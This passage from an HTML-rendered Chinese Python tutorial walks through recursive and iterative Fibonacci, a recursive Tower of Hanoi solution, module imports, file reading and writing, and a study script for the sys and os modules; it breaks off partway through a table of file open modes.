data-num=\"3\"></td><td><pre>F<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>    <span class=\"token number\">1</span>               当n<span class=\"token operator\">=</span><span class=\"token number\">2</span>时    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>          F<span class=\"token punctuation\">(</span>n-1<span class=\"token punctuation\">)</span>+F<span class=\"token punctuation\">(</span>n-2<span class=\"token punctuation\">)</span>   当n<span class=\"token operator\">></span><span class=\"token number\">2</span>时</pre></td></tr></table></figure><p>假设需要求 20 个月后有多少只兔子</p>\n<p>迭代实现</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">def</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        a <span class=\"token operator\">=</span> b <span class=\"token operator\">=</span> c <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">if</span> n <span class=\"token operator\">&lt;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"输入有误\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>n <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            c <span class=\"token operator\">=</span> a <span class=\"token operator\">+</span> b</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            a <span class=\"token operator\">=</span> b</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            b <span class=\"token operator\">=</span> c</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            n <span class=\"token operator\">-=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">return</span> c</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> f<span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token number\">6765</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> f<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token number\">144</span></pre></td></tr></table></figure><p>递归实现</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">def</span> <span class=\"token function\">recursion</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">if</span> n<span class=\"token operator\">&lt;</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"输入有误\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">if</span> n <span class=\"token operator\">==</span><span class=\"token number\">1</span> <span class=\"token keyword\">or</span> n <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> recursion<span class=\"token punctuation\">(</span>n<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> recursion<span class=\"token punctuation\">(</span>n<span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> recursion<span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token number\">6765</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> recursion<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token number\">144</span></pre></td></tr></table></figure><p>当你把 20 个月调成 35 个月时</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> f<span class=\"token punctuation\">(</span><span class=\"token number\">35</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#毫秒级就完成运算了</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">9227465</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> recursion<span class=\"token punctuation\">(</span><span class=\"token number\">35</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#大概有 3 秒才完成运算</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">9227465</span></pre></td></tr></table></figure><p>为了体现递归正确的使用优势。<br />\n来看一看汉诺塔难题。</p>\n<p>规则是有三根铁针，其中一根针上从下到上穿好了由大到小的 n 个盘子，这些金片一次只能移动一片，不管在那根针上小盘必须在大盘上面，要把所有盘子从一根针上移动到另一根针上。</p>\n<blockquote>\n<p>我们先来分析思路<br />\n对于游戏的玩法，可以简单分解为三个步骤:<br />\n1. 首先将前 n-1 个盘子从 X 移动到 Y 上，确保大盘在小盘下。<br />\n2. 将最底下的第 n 个盘子移动在 Z 上<br />\n 3. 将 Y 上的 n-1 个盘子移动到 Z 上</p>\n</blockquote>\n<p>想要实现步骤 1 和 3，都必须要借助另一个针，接着分析问题<br />\n问题一：步骤 1 将 X 针上的 1~n-1 个盘子需要借助 Z 移动到 Y 上；<br />\n问题二：步骤 3 将 Y 针上的 n-1 个盘子需要借助 X 移动到 Z 上。<br />\n而解决这两个问题的方法跟刚才的思路一样都可分成三个步骤。</p>\n<p>问题一（将 X 针上的 1~n-1 个盘子借助 Z 移动到 Y 上）拆解：<br />\n（1）首先将前 n-2 个盘子从 X 移动到 Z 上，确保大盘在小盘下。<br />\n（2）将最底下的第 n-1 个盘子移动在 Y 上<br />\n（3）将 Y 上的 n-2 个盘子移动到 Y 上</p>\n<p>问题二（将 Y 针上的 n-1 个盘子借助 X 移动到 Z 上）拆解：<br />\n（1）首先将前 n-2 个盘子从 Y 移动到 X 上，确保大盘在小盘下。<br />\n（2）将最底下的第 n-1 个盘子移动在 Z 上<br />\n（3）将 X 上的 n-2 个盘子移动到 Y 上</p>\n<p>没错拆解过程刚好满足递归算法的定义，因此可以使用递归来解决。<br />\n参考代码</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">def</span> <span class=\"token function\">hanoi</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">,</span>z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">if</span> n<span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span><span class=\"token string\">'-->'</span><span class=\"token punctuation\">,</span>z<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            hanoi<span class=\"token punctuation\">(</span>n<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>x<span class=\"token punctuation\">,</span>z<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span><span class=\"token string\">'-->'</span><span class=\"token punctuation\">,</span>z<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            hanoi<span class=\"token punctuation\">(</span>n<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">,</span>x<span class=\"token punctuation\">,</span>z<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> n <span class=\"token operator\">=</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> hanoi<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span><span class=\"token string\">'X'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Y'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Z'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>X <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span> Z</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>X <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span> Y</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Z <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span> Y</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>X <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span> Z</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>Y <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span> X</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Y <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span> Z</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>X <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span> Z</pre></td></tr></table></figure><h2 id=\"模块包以及文件处理\"><a class=\"anchor\" href=\"#模块包以及文件处理\">#</a> 模块 / 包以及文件处理</h2>\n<h3 id=\"模块包\"><a class=\"anchor\" href=\"#模块包\">#</a> 模块 / 包</h3>\n<p>模块： .py 文件<br />\n包： python package</p>\n<p>模块：模块是函数和类的集合；在 python 中一个文件既是一个模块。<br />\n包：包是模块的集合；将多个模块放在一个文件夹内，就形成了一个包。</p>\n<h3 id=\"导入模块\"><a class=\"anchor\" href=\"#导入模块\">#</a> 导入模块</h3>\n<p>1，improt 模块名</p>\n<p>调用：模块名。功能名</p>\n<p>2，import 模块名 as 别名</p>\n<p>调用：别名。功能名</p>\n<p>3，from 模块名 import 功能名</p>\n<p>调用：直接功能名</p>\n<p>4，from 模块名 import 功能名 as 别名</p>\n<p>调用： 直接拿别名来用</p>\n<p>5，from 模块名 import * （用 * 号 一次性导入所有功能）</p>\n<p>调用：直接功能名</p>\n<p>注意点：* 号没法用别名</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2MuYmlhbmNoZW5nLm5ldC92aWV3LzQ2NDUuaHRtbA==\">导入模块详解</span></p>\n<h3 id=\"文件处理\"><a class=\"anchor\" href=\"#文件处理\">#</a> 文件处理</h3>\n<p>a. 操作模式：r、w、a、b</p>\n<p>b. 读<br />\n①read (): 读取文件中的所有内容<br />\n②readline (): 读取单行内容<br />\n③readlines (): 以行的形式读取所有内容，返回一个包含了每一行的序列</p>\n<p>c. 写<br />\n①write (写入内容)：将指定内容写入文件中<br />\n②writelines (序列)：将序列中的每一元素，作为单独的行，按照行的形式写入</p>\n<p>d. 其他<br />\n①tell (): 返回光标当前所在的位置<br />\n②seek (步长，起始位置): 将光标移动到指定的位置<br />\n (0,0) 表示移动光标到文章最开头的地方</p>\n<h1 id=\"sys和os库复习\"><a class=\"anchor\" href=\"#sys和os库复习\">#</a> sys 和 os 库复习</h1>\n<p>os、os.path 模块中关于文件、目录常用的函数使用方法 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2tva282Ni9hcnRpY2xlL2RldGFpbHMvNDI3MDkzMTM=\">https://blog.csdn.net/koko66/article/details/42709313</span></p>\n<p>这是以前的代码</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># @FileName  :sys_os_module.py</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># @Author    :1asy</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># @motto     :</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 不深思则不能造于道。不深思而得者，其得易失。</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>学习sys与os模块</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>sys模块的常见函数列表</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>sys.argv: 实现从程序外部向程序传递参数。</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>sys.exit([arg]): 程序中间的退出，arg=0为正常退出。</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>sys.stdout.write('please:'):标准输出，引出进度条的例子</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>sys.getrecursionlimit() :获取最大递归层数</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sys.setrecursionlimit(1200):设置最大递归层数</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sys.getdefaultencoding(): 获取系统当前编码，一般默认为ascii。</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sys.setdefaultencoding(): 设置系统默认编码，执行dir（sys）时不会看到这个方法，在解释器中执行不通过，</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>可以先执行reload(sys)，在执行 setdefaultencoding('utf8')，此时将系统默认编码设置为utf8。（见设置系统默认编码 ）</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>sys.getfilesystemencoding(): 获取文件系统使用编码方式，Windows下返回'mbcs'，mac下返回'utf-8'.</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sys.path: 获取指定模块搜索路径的字符串集合，可以将写好的模块放在得到的某个路径下，就可以在程序中import时正确找到。</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>sys.platform: 获取当前系统平台。</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>sys.stdin,</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>sys.stdout,</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>sys.stderr: stdin , stdout , 以及stderr 变量包含与标准I/O 流对应的流对象.</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>如果需要更好地控制输出,而print 不能满足你的要求, 它们就是你所需要的. 你也可以替换它们,</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>这时候你就可以重定向输出和输入到其它设备( device ), 或者以非标准的方式处理它们</pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>sys.exit()</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>sys.path</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>sys.stdin</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>sys.stdout</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>sys.stderr</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sys.argv</pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">globmodule</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    这个模块可以列出特定工作目录内容，并且支持使用通配符 \"*\" ,  如：\"*.py\"</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    '''</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">import</span> glob</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token comment\">#返回一个列表</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    dirs <span class=\"token operator\">=</span> glob<span class=\"token punctuation\">.</span>glob<span class=\"token punctuation\">(</span><span class=\"token string\">'*.py'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>dirs<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">SYS_study</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">argvfun</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        pycharm中设置参数 shift + Alt + F10</pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        '''</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        my_argv <span class=\"token operator\">=</span> sys<span class=\"token punctuation\">.</span>argv</pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> my_argv<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">pathfun</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        获取指定模块搜索路径的字符串集合，可以将写好的模块放在得到的某个路径下，就可以在程序中import时正确找到。</pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        '''</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">sys_stdout_writefun</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        打印刷新</pre></td></tr><tr><td data-num=\"68\"></td><td><pre>        其关键就在于使用'\\r'这个转义字符（回到行首），</pre></td></tr><tr><td data-num=\"69\"></td><td><pre>        '''</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>        <span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"71\"></td><td><pre>        s <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>            e <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>            sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\r正在打印&#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>e <span class=\"token operator\">-</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">OS_STUDY</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>        <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">getfun</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>        <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"81\"></td><td><pre>        列出目前工作目录</pre></td></tr><tr><td data-num=\"82\"></td><td><pre>        '''</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>getcwd<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">absfun</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>        <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"86\"></td><td><pre>        取得绝对路径</pre></td></tr><tr><td data-num=\"87\"></td><td><pre>        os.path.abspath(path)</pre></td></tr><tr><td data-num=\"88\"></td><td><pre>        传回path的绝对路径</pre></td></tr><tr><td data-num=\"89\"></td><td><pre>        '''</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>abspath<span class=\"token punctuation\">(</span><span class=\"token string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#列出上一层工作目录的绝对路径</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>abspath<span class=\"token punctuation\">(</span><span class=\"token string\">'sys_os_module.py'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#列出当前文件的绝对路径</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre></pre></td></tr><tr><td data-num=\"94\"></td><td><pre></pre></td></tr><tr><td data-num=\"95\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    code <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>    <span class=\"token comment\"># s = SYS_study()</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>    <span class=\"token comment\"># s.pathfun()</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>    <span class=\"token comment\"># s.sys_stdout_writefun()</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>    o <span class=\"token operator\">=</span> OS_STUDY<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>    <span class=\"token comment\"># o.getfun()</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>    <span class=\"token comment\"># o.absfun()</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>    <span class=\"token comment\"># print (os.sep)  # 输出当前操作系统的路径分隔符</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>    <span class=\"token comment\"># print (os.system ('ipconfig'))  # 运行 shell 命令，直接显示</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>    <span class=\"token comment\"># print (os.path.exists ('b.txt'))  # 如果 path 存在则返回 true，否则返回 false</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>    <span class=\"token comment\"># os.path.isabs (path)  # 如果 path 是绝对路径则返回 true</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>    <span class=\"token comment\"># os.path.isfile (path)  # 如果 path 是一个存在的文件返回 true，否则返回 false</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>    <span class=\"token comment\"># os.path.isdir (path)  # 如果 path 是一个存在的目录则返回 true，否则返回 false</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>    <span class=\"token triple-quoted-string string\">'''os.path.join() 有用  '''</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>    <span class=\"token comment\"># os.path.join (pthh1, path2, [...])  # 将多个路径组合后返回。参数可以有 2 到多个</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>    <span class=\"token comment\">#os.listdir (path), 以列表的方式列出特定工作目录的内容</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>    <span class=\"token comment\"># print(os.listdir('.'))</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>    <span class=\"token comment\"># globmodule()</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>    <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"116\"></td><td><pre>    os.mkdir(path) 建立path目录</pre></td></tr><tr><td data-num=\"117\"></td><td><pre>    os.rmdir(path) 删除path目录 ,但只能是空目录</pre></td></tr><tr><td data-num=\"118\"></td><td><pre>    os.remove(path) 删除指定文件</pre></td></tr><tr><td data-num=\"119\"></td><td><pre>    os.chdir(path) 更改到path工作目录</pre></td></tr><tr><td data-num=\"120\"></td><td><pre>    '''</span></pre></td></tr></table></figure><p>记一些常用的重要方法。</p>\n<h1 id=\"文件读写\"><a class=\"anchor\" href=\"#文件读写\">#</a> 文件读写</h1>\n<h2 id=\"打开模式\"><a class=\"anchor\" href=\"#打开模式\">#</a> 打开模式</h2>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:right\">模式</th>\n<th style=\"text-align:right\">操作</th>\n<th 